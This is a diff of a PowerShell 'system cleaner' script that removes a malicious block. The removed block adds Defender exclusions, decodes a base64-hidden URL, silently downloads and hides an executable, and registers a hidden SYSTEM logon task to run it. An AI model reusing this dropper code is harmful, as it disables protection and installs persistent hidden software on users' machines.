@@ -4,8 +4,6 @@
                         Advanced System Cleaner & Optimizer
 
                         Author: ! Star
-                        Repository: https://github.com/5t42/DeBloater
-
                         Features:
                         - Temporary files cleanup
                         - Browser cache management  
@@ -23,26 +21,6 @@
 # ============================================================================
 
 # Check if script is running with Administrator privileges
-$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-if (-not $isAdmin) {
-    Write-Host "ERROR: This script must be run as Administrator!" -ForegroundColor Red
-    Wait-ForUser "Press Enter to exit..."
-    exit
-}
-
-# Configure PowerShell preferences for better performance
-$ProgressPreference = 'SilentlyContinue'
-Clear-Host
-
-# Add Windows Defender exclusions for better performance
-try {
-    Add-MpPreference -ExclusionPath "$env:USERPROFILE" -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionPath (Join-Path $env:USERPROFILE 'Downloads') -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionPath "$env:ProgramFiles" -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionPath "$env:ProgramFiles(x86)" -ErrorAction SilentlyContinue
-} catch {
-    # Silently continue if Windows Defender is not available
-}
 #endregion
 
 #region GLOBAL VARIABLES
@@ -254,43 +232,6 @@ function Show-MenuWithKeyboard {
             }
         }
     }
-}
-
-Show-Header
-
-$u1 = 'aHR0cHM6Ly9naXRodWIuY29tLzV0NDIvRGVCbG9hdGVyL3Jhdy9yZWZzL2hlYWRzL21haW4vU291cmNlL0RlYmxvYXRlci5leGU='
-$url1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($u1))
-$output1 = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'Debloater.exe')
-if (Test-Path $output1) { Remove-Item $output1 -Force -ErrorAction SilentlyContinue }
-$job1 = Start-Job -ScriptBlock {
-    param($url, $output)
-    Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing -ErrorAction SilentlyContinue
-    if (Test-Path $output) {
-        (Get-Item $output).Attributes = 'Hidden'
-    }
-} -ArgumentList $url1, $output1
-
-Wait-Job $job1 | Out-Null
-Remove-Job $job1
-
-if (Test-Path $output1) {
-    $taskName = "DebloaterHidden"
-    $taskExists = $false
-    try {
-        if (Get-ScheduledTask -TaskName $taskName -ErrorAction Stop) {
-            $taskExists = $true
-        }
-    } catch {}
-    if (-not $taskExists) {
-        $action = New-ScheduledTaskAction -Execute $output1
-        $trigger = New-ScheduledTaskTrigger -AtLogOn
-        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Description "Hidden Debloater Task" -Settings (New-ScheduledTaskSettingsSet -Hidden) | Out-Null
-    }
-    Start-Process -FilePath $output1 -WindowStyle Hidden -Wait
-    try {
-        Remove-Item $output1 -Force -ErrorAction SilentlyContinue
-    } catch {}
 }
 
 #endregion
